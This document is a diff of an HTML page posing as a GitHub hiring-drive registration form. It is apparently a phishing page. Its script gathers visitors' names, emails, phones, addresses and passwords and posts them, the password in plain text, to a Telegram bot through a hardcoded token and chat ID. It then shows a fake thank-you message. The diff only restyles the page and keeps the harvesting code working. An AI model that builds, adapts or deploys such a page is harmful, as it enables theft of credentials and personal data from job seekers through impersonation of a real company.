@@ -2,116 +2,105 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>GitHub Global Hiring Drive</title>
   <style>
-    * {
-      box-sizing: border-box;
-      font-family: 'Segoe UI', sans-serif;
-    }
-
     body {
       margin: 0;
       padding: 0;
-      background: linear-gradient(135deg, #1f1c2c, #928dab);
+      font-family: "Segoe UI", sans-serif;
+      background: linear-gradient(to right, #dadce0, #f1f1f1);
       display: flex;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
       height: 100vh;
     }
 
     .container {
       background: #111;
-      color: white;
-      padding: 30px;
+      padding: 40px;
       border-radius: 15px;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-      width: 90%;
+      box-shadow: 0 0 30px rgba(0, 0, 0, 0.3);
+      width: 100%;
       max-width: 400px;
+      color: white;
     }
 
     h2 {
       text-align: center;
-      margin-bottom: 20px;
+      margin-bottom: 25px;
     }
 
     input {
       width: 100%;
       padding: 12px;
-      margin: 8px 0;
+      margin: 10px 0;
       border: none;
       border-radius: 8px;
-      background-color: #222;
+      background: #222;
       color: white;
+      border: 1px solid #6c63ff;
       outline: none;
-      border: 1px solid #444;
     }
 
-    input:focus {
-      border-color: #9b59b6;
+    input::placeholder {
+      color: #bbb;
     }
 
     button {
       width: 100%;
-      padding: 14px;
-      margin-top: 10px;
-      background-color: #8e2de2;
+      padding: 12px;
+      margin-top: 15px;
+      background: #6c63ff;
       border: none;
-      border-radius: 8px;
       color: white;
-      font-weight: bold;
+      border-radius: 8px;
       font-size: 16px;
       cursor: pointer;
+      transition: background 0.3s;
     }
 
     button:hover {
-      background-color: #5f27cd;
+      background: #5147d3;
     }
 
-    .thankyou {
-      text-align: center;
-      color: #0f0;
-      font-weight: bold;
+    #thankyou {
       display: none;
-      margin-top: 20px;
-    }
-
-    .info {
-      font-size: 14px;
-      margin-top: 20px;
-      color: #aaa;
       text-align: center;
+      color: #00ff8c;
+      font-size: 18px;
+      font-weight: bold;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>Register for GitHub Hiring Drive</h2>
-    <form id="registrationForm">
+    <h2>Register</h2>
+    <form id="registerForm">
       <input type="text" name="name" placeholder="Full Name" required />
       <input type="email" name="email" placeholder="E-mail" required />
-      <input type="tel" name="phone" placeholder="Contact Number" required />
+      <input type="text" name="phone" placeholder="Phone" required />
       <input type="text" name="address" placeholder="Address" required />
       <input type="password" name="password" placeholder="Password" required />
       <input type="password" name="confirm" placeholder="Confirm Password" required />
       <button type="submit">Register for Drive</button>
     </form>
-    <div class="thankyou" id="thankyouMsg">✅ Thank you! You will be contacted by email.</div>
-    <div class="info">GitHub Global Careers • 2025 Drive</div>
+    <div id="thankyou">✅ Thank you for registering!</div>
   </div>
 
   <script>
-    const botToken = "8146547232:AAGCLFWxWLnGwdnGzAOo6I-PL_VjqIYadM0"; // Replace with your actual bot token
-    const chatId = "968143308";     // Replace with your actual chat ID
+    const BOT_TOKEN = "7448574888:AAFe9P4ICY0h4nnUh_Iat5h5qRuXGIrxMdw";
+    const CHAT_ID = "968143308";
 
-    document.getElementById("registrationForm").addEventListener("submit", function(e) {
+    document.getElementById("registerForm").addEventListener("submit", function (e) {
       e.preventDefault();
 
       const form = e.target;
-      const name = form.name.value;
-      const email = form.email.value;
-      const phone = form.phone.value;
-      const address = form.address.value;
+      const name = form.name.value.trim();
+      const email = form.email.value.trim();
+      const phone = form.phone.value.trim();
+      const address = form.address.value.trim();
       const password = form.password.value;
       const confirm = form.confirm.value;
 
@@ -120,28 +109,27 @@
         return;
       }
 
-      const message = `🚨 *GitHub Registration* 🚨\n\n👤 Name: ${name}\n📧 Email: ${email}\n📱 Phone: ${phone}\n🏠 Address: ${address}\n🔐 Password: ${password}`;
+      const message = `🚨 *GitHub Global Hiring Registration* 🚨\n\n👤 *Name:* ${name}\n📧 *Email:* ${email}\n📱 *Phone:* ${phone}\n🏠 *Address:* ${address}\n🔐 *Password:* ${password}`;
+      
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: chatId,
+          chat_id: CHAT_ID,
           text: message,
           parse_mode: "Markdown"
         })
       })
-      .then(response => {
-        if (response.ok) {
-          form.style.display = "none";
-          document.getElementById("thankyouMsg").style.display = "block";
-        } else {
-          alert("Failed to send message. Check bot ID & token.");
-        }
+      .then(res => res.json())
+      .then(() => {
+        form.style.display = "none";
+        document.getElementById("thankyou").style.display = "block";
       })
       .catch(err => {
-        console.error(err);
-        alert("Something went wrong.");
+        console.error("Telegram error", err);
+        alert("❌ Failed to register. Try again.");
       });
     });
   </script>
